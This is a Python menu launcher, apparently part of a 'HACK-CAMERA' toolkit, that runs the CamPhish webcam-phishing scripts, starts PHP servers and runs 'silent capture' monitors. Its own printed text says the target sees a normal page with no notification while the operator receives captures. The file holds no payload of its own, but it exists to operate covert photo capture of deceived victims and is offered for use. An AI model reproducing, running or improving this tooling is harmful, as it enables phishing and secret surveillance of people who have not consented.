import os
import sys
import time
import subprocess
import platform
from colorama import init, Fore, Style

# Optional TTS imports
try:
    import win32com.client
except ImportError:
    win32com = None

try:
    import pyttsx3
except ImportError:
    pyttsx3 = None

# Initialize Colorama
init(autoreset=True)

# Color definitions
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
MAGENTA = Fore.MAGENTA
CYAN = Fore.CYAN
WHITE = Fore.WHITE
RESET = Style.RESET_ALL

# Store initial working directory
INITIAL_DIR = os.getcwd()

# Logo displayed in main menu
LOGO = r"""
{BLUE}   _   _    _    ____ _  __      ____    _    __  __ _____ ____      _   
{BLUE}  | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \  
{BLUE}  | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \ 
{BLUE}  |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
{BLUE}  |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\

{GREEN}                             [By X PHANTOM (PH4N7OM)]
{RED}                               [By SomniumN1 (Ashera12)]
{GREEN}   The lady.....  ..              >> BiLaNazmi<< [SomniumN1]
"""

def run_tts(text, rate=0, volume=1.0):
    try:
        system_os = platform.system()
        if system_os == "Windows" and win32com:
            speaker = win32com.client.Dispatch("SAPI.SpVoice")
            speaker.Rate = rate
            speaker.Volume = int(volume * 100)
            speaker.Speak(text)
        elif pyttsx3:
            engine = pyttsx3.init()
            engine.setProperty('rate', 150 + rate * 10)
            engine.setProperty('volume', volume)
            engine.say(text)
            engine.runAndWait()
            engine.stop()
        else:
            print(f"{YELLOW}TTS tidak tersedia di sistem ini.")
    except Exception as e:
        print(f"{RED}Text-to-speech error: {e}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_menu():
    clear_screen()
    print(LOGO.format(BLUE=BLUE, GREEN=GREEN, RED=RED))
    print(f"{CYAN}[1]{WHITE} CamPhish (AUTO mode - Auto-download & fallback)")
    print(f"{CYAN}[2]{WHITE} CamPhish (MANUAL mode - Standard setup)")
    print(f"{CYAN}[3]{WHITE} Real-Time Monitor (Full Features)")
    print(f"{CYAN}[4]{WHITE} Real-Time Monitor (Basic)")
    print(f"{CYAN}[5]{WHITE} CamPhish AUTO with Silent Monitor (Recommended)")
    print(f"{CYAN}[6]{WHITE} All Auto with Fallback (Universal)")
    print(f"{CYAN}[0]{WHITE} Exit")

def execute_command(command):
    try:
        subprocess.run(command, check=True)
    except FileNotFoundError:
        print(f"{RED}Perintah '{command[0]}' tidak ditemukan.")
        time.sleep(3)
    except subprocess.CalledProcessError as e:
        print(f"{RED}Gagal menjalankan perintah: {e}")
        time.sleep(3)
    except Exception as e:
        print(f"{RED}Kesalahan tidak terduga: {e}")
        time.sleep(3)

def run_camphish(folder, script):
    clear_screen()
    print(f"{WHITE}Menjalankan {folder}...")
    time.sleep(2)
    try:
        os.chdir(folder)
        clear_screen()
        print(f"{MAGENTA}Loading tools...")
        time.sleep(2)
        execute_command(['bash', script])
    except FileNotFoundError:
        print(f"{RED}Folder '{folder}' tidak ditemukan.")
        time.sleep(3)
    finally:
        os.chdir(INITIAL_DIR)

def run_camphish_with_monitor():
    clear_screen()
    print(f"{GREEN}Starting CamPhish with Silent Capture Monitor...")
    print(f"{CYAN}Target akan melihat halaman normal tanpa notifikasi apa pun")
    print(f"{CYAN}Anda akan menerima notifikasi capture di terminal ini")
    time.sleep(2)
    try:
        os.chdir("CamPhish")
        clear_screen()
        print(f"{MAGENTA}Starting CamPhish with capture monitor...")
        time.sleep(2)
        
        # Start capture monitor in background
        if platform.system() == "Windows":
            subprocess.Popen(['php', 'capture_notifier.php'])
            time.sleep(2)
            execute_command(['bash', 'camphish_auto.sh'])
        else:
            execute_command(['bash', 'run_with_monitor.sh'])
    except FileNotFoundError:
        print(f"{RED}Monitor files tidak ditemukan.")
        time.sleep(3)
    finally:
        os.chdir(INITIAL_DIR)
def run_all_auto_with_fallback():
    clear_screen()
    print(f"{GREEN}Starting All Auto with Universal Fallback...")
    print(f"{CYAN}This will try multiple methods to run CamPhish with all features")
    time.sleep(2)
    try:
        os.chdir("CamPhish")
        clear_screen()
        print(f"{MAGENTA}Attempting universal CamPhish launcher...")
        time.sleep(2)
        
        system_os = platform.system()
        
        if system_os == "Windows":
            print(f"{CYAN}Windows detected - trying run-camphish.bat fallback...")
            execute_command(['run-camphish.bat'])
        else:
            print(f"{CYAN}Linux/Mac detected - using universal launcher...")
            execute_command(['bash', 'run_universal.sh'])
            
    except FileNotFoundError:
        print(f"{RED}Universal launcher not found. Trying direct methods...")
        # Try direct bash script
        try:
            execute_command(['bash', 'camphish_auto.sh'])
        except:
            print(f"{RED}Bash failed. Starting PHP server only...")
            execute_command(['php', '-S', '0.0.0.0:8080'])
    finally:
        os.chdir(INITIAL_DIR)
def run_monitor(monitor_type):
    clear_screen()
    if monitor_type == "full":
        print(f"{GREEN}Starting Real-Time Monitor (Full Features)...")
        print(f"{CYAN}Monitor akan berjalan di http://localhost:9999/monitor_full.html")
    else:
        print(f"{GREEN}Starting Real-Time Monitor (Basic)...")
        print(f"{CYAN}Monitor akan berjalan di http://localhost:9999/monitor.html")
    
    time.sleep(2)
    try:
        os.chdir("CamPhish")
        clear_screen()
        print(f"{MAGENTA}Starting monitor server...")
        time.sleep(2)
        
        # Start monitor server
        if platform.system() == "Windows":
            subprocess.run(['php', '-S', '0.0.0.0:9999'])
        else:
            execute_command(['bash', 'monitor.sh'])
    except FileNotFoundError:
        print(f"{RED}Monitor files tidak ditemukan.")
        time.sleep(3)
    finally:
        os.chdir(INITIAL_DIR)

def main():
    run_tts("Welcome to the program!", rate=0)
    run_tts("My name is SomniumN1, I am a programmer", rate=1)
    time.sleep(1.5)  # Pastikan TTS selesai sebelum melanjutkan

    while True:
        show_menu()
        try:
            choice = input(f"{YELLOW}Pilih opsi: {RESET}")
            if choice == '1':
                run_camphish("CamPhish", "camphish_auto.sh")
                input(f"\n{GREEN}Selesai. Tekan Enter untuk kembali ke menu.")
            elif choice == '2':
                run_camphish("CamPhish", "camphish.sh")
                input(f"\n{GREEN}Selesai. Tekan Enter untuk kembali ke menu.")
            elif choice == '3':
                run_monitor("full")
                input(f"\n{GREEN}Monitor dihentikan. Tekan Enter untuk kembali ke menu.")
            elif choice == '4':
                run_monitor("basic")
                input(f"\n{GREEN}Monitor dihentikan. Tekan Enter untuk kembali ke menu.")
            elif choice == '5':
                run_camphish_with_monitor()
                input(f"\n{GREEN}CamPhish dengan monitor dihentikan. Tekan Enter untuk kembali ke menu.")
            elif choice == '6':
                run_all_auto_with_fallback()
                input(f"\n{GREEN}All Auto dengan fallback dihentikan. Tekan Enter untuk kembali ke menu.")
            elif choice == '0':
                clear_screen()
                print(f"{CYAN}JUST HOPING TO BE HER HOPE :)")
                time.sleep(1)
                sys.exit(0)
            else:
                print(f"{RED}Input tidak valid. Coba lagi.")
                time.sleep(2)
        except KeyboardInterrupt:
            clear_screen()
            print(f"\n{CYAN}Program dihentikan. Sampai jumpa!")
            sys.exit(0)

if __name__ == "__main__":
    main()
